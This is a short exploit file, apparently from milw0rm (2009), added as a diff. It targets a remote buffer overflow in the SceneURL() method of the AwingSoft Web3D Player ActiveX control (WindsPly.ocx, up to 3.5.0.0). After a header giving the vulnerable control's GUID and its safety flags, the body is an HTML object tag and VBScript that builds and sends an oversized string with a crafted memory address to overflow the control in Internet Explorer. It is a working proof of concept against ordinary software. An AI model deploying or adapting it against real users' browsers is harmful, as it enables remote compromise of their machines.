@@ -1,0 +1,41 @@
+-----------------------------------------------------------------------------
+ AwingSoft Web3D Player (WindsPly.ocx) "SceneURL()" Remote Buffer Overflow
+ url: http://www.awingsoft.com/
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://www.shinnai.net/
+
+ Dedicated to aaannamariaaa :D
+
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.
+
+ File: WindsPly.ocx
+ Ver.: <= 3.5.0.0
+ GUID: {17A54E7D-A9D4-11D8-9552-00E04CB09903}
+ ProgID: WindsPlayerIE.View.1
+
+ Marked as:
+ RegKey Safe for Script: Falso
+ RegKey Safe for Init: Falso
+ Implements IObjectSafety: Vero
+ IDisp Safe: Safe for untrusted: caller,data
+ IPersist Safe: Safe for untrusted: caller,data
+ IPStorage Safe: Safe for untrusted: caller,data
+
+ Tested on Windows XP Professional SP3 all patched, with Internet Explorer 8
+-----------------------------------------------------------------------------
+<object classid='clsid:17A54E7D-A9D4-11D8-9552-00E04CB09903' id='test'></object>
+
+<script language='vbscript'>
+  buff = String(8704, "A")
+  mReg = unescape("bbbb")
+  mExc = unescape("%00%00%01%00") 'Memory address: 00010000 Access: RW
+  buf1 = String(88, "c")
+  buf2 = String(47284, "D")
+
+  test.SceneURL = buff + mReg + mExc + buf1 + buf2
+</script>
+
+# milw0rm.com [2009-07-10]
